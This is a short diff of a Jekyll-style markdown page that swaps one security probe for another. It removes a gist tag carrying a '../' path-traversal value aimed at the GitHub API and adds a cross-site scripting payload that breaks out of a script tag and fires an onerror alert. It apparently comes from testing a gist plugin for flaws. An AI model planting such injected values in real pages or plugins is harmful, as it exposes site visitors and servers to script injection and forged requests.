@@ -1,8 +1,7 @@
 ---
 ---
 
-# Gist API Path Traversal Test
+# XSS Test
 
-Testing if gist_id with ../ traverses GitHub API path.
+{% gist x"></script><img/src=x onerror=alert(document.domain)><script%20x=" %}
 
-{% gist ../../repos/buugdig/gist-ssrf-test %}
